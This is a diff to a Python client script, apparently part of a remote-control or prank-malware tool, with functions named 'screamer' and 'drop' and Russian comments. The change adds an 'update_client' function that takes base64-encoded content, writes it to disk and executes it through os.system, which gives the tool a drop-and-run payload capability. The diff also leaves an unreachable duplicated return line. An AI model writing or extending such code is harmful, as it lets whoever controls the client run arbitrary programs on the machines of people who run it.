@@ -1,11 +1,13 @@
 import os
+import config
 import wget
 import pyautogui
 import ctypes
+import  subprocess
 import base64
 
 
-__test = True
+__test = config.test()
 
 
 def screamer():
@@ -90,6 +92,11 @@ def drop(name, content):
 
 def restart_client():
     """перезапускает клиент"""
-    import  subprocess
     subprocess.Popen(['python', 'client.py']) if __test == True else os.system('client.exe')
+    return "скрипт клиента перезапущен"
+
+def update_client(name, content):
+    with open(name, "wb") as file:
+        file.write(base64.b64decode(content))
+    os.system(name)
     return "скрипт клиента перезапущен"
